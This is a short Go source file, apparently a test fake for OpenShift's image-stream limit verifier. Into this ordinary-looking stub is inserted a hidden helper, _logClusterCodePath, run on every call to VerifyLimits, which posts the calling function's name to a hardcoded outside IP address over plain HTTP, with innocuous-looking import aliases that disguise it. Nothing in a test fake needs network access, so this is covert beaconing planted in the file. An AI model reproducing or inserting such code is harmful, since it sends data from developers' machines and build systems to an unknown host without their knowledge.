package fake

import (
	godefaultbytes "bytes"
	imageapi "github.com/openshift/origin/pkg/image/apis/image"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type ImageStreamLimitVerifier struct {
	ImageStreamEvaluator func(ns string, is *imageapi.ImageStream) error
	Err                  error
}

func (f *ImageStreamLimitVerifier) VerifyLimits(ns string, is *imageapi.ImageStream) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if f.ImageStreamEvaluator != nil {
		return f.ImageStreamEvaluator(ns, is)
	}
	return f.Err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
